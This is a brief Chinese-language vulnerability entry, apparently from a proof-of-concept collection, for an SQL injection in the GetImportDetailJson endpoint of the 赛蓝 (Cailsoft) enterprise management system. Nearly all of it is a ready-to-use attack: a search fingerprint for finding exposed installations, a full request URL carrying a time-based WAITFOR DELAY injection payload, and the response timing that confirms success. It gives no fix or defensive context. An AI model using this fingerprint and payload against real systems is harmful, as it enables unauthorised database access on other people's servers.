# 赛蓝企业管理系统GetImportDetailJson存在SQL注入漏洞

赛蓝企业管理系统 ｜ SQL注入 ｜ —
- **指纹**：`body="www.cailsoft.com"`
- **请求**：`http://IP/BaseModule/ExcelImport/GetImportDetailJson?ImportId=1%27%3bWAITFOR+DELAY+'0:0:5'--`
- **响应特征**：200 响应时间>5s